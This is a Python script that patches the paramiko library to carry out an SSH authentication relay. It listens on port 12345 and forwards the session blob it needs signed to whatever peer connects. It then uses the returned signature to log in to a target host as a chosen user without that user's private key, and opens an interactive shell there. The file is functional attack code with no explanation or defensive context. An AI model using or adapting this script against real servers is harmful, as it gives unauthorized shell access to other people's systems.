import argparse 
import socket
import interactive
import paramiko

def _auth(self, username, password, pkey, key_filenames, allow_agent, look_for_keys, gss_auth, gss_kex, gss_deleg_creds, gss_host, passphrase,):
    self._transport.auth_publickey(username, None)

def _parse_service_accept(self, m):
    service = m.get_text()
    if service == "ssh-userauth":
        m = paramiko.Message()
        m.add_byte(paramiko.common.cMSG_USERAUTH_REQUEST)
        m.add_string(self.username)
        m.add_string("ssh-connection")
        m.add_string(self.auth_method)
        if self.auth_method == "publickey":
            m.add_boolean(True)
            key_type, bits = self._get_key_type_and_bits(self.private_key)
            algorithm = self._finalize_pubkey_algorithm(key_type)
            m.add_string(algorithm)
            m.add_string(bits)
            blob = self._get_session_blob(
                self.private_key,
                "ssh-connection",
                self.username,
                algorithm,
            )
            print(f'blob to sign = {blob.hex()}')
            conn.sendall(blob)
            sig = conn.recv(1024)
            print(f'sig = {sig.hex()}')
            m.add_string(sig)
        else:
            raise SSHException(
                'Unknown auth method "{}"'.format(self.auth_method)
            )
        self.transport._send_message(m)
    else:
        self._log(
            DEBUG, 'Service request "{}" accepted (?)'.format(service)
        )

def _get_session_blob(self, key, service, username, algorithm):
    m = paramiko.Message()
    m.add_string(self.transport.session_id)
    m.add_byte(paramiko.common.cMSG_USERAUTH_REQUEST)
    m.add_string(username)
    m.add_string(service)
    m.add_string("publickey")
    m.add_boolean(True)
    _, bits = self._get_key_type_and_bits(key)
    m.add_string(algorithm)
    m.add_int(len(bits))
    m.add_bytes(bits)
    return m.asbytes()


def _get_key_type_and_bits(self, key):
    return "ssh-ed25519", bytes.fromhex(args.pub)

#overwriting paramiko functions
paramiko.SSHClient._auth = _auth
paramiko.AuthHandler._get_key_type_and_bits = _get_key_type_and_bits
paramiko.AuthHandler._get_session_blob = _get_session_blob
paramiko.AuthHandler._parse_service_accept = _parse_service_accept
_client_handler_table = paramiko.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = _parse_service_accept



if __name__== "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-o", "--own-ip", required=True, help="Own ip address")
	parser.add_argument("-t", "--target", required=True, help="Hostname of ssh target")
	parser.add_argument("-u", "--user", required=True, help="User of ssh target")
	parser.add_argument("-p", "--port", required=True, help="Port of ssh target")
	parser.add_argument("--pub", required=True, help="Public key used for authentication as hex")
	args = parser.parse_args()


	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.bind((args.own_ip, 12345))
		s.listen()
		while True: 
			conn, addr = s.accept()
			print(f'Connected by: {addr}')
			with conn: 
				client = paramiko.SSHClient()
				client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				client.connect(
					args.target,
					args.port,
					args.user,
				)
				chan = client.invoke_shell()
				interactive.interactive_shell(chan)
				chan.close()
				client.close()
